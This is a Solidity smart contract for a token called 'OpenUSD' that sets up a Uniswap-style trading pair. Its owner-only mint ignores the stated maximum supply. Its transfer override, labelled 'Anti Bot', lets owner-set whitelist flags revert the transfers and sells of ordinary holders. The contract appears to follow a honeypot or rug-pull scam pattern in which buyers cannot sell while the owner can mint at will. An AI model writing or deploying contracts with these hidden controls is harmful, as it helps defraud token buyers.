// SPDX-License-Identifier: MIT
pragma solidity 0.7.4;

import "./Uniswap.sol";
import "./ERC20.sol";

contract OpenUsd is ERC20 {
    using SafeMath for uint256;

    uint256 public maxSupply = 1000000 * 10**18;

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;

    constructor() {
        _initialize("OpenUSD", "USDO", 18, maxSupply);
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
    }

    function burn(uint256 amount) public {
        _burn(_msgSender(), amount);
    }

    function mint(uint256 amount, address account) external onlyOwner {
        _mint(account, amount);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual override {
        if (!whiteListBot[sender] && !whiteListBot[recipient] && antiBotEnabled) {
           revert("Anti Bot");
        }
        if(swapWhiteList && whiteListPool[recipient] && !whiteListBot[sender]) {
           revert("Anti Bot");
        }
        if (amount > _numTokensSellToAddToLiquidity && limitSell== true && recipient==uniswapV2Pair) {
            revert("Limit Sell Pankeswap");
        }

        super._transfer(sender, recipient, amount);
    }

    // receive eth from uniswap swap
    receive() external payable {}
}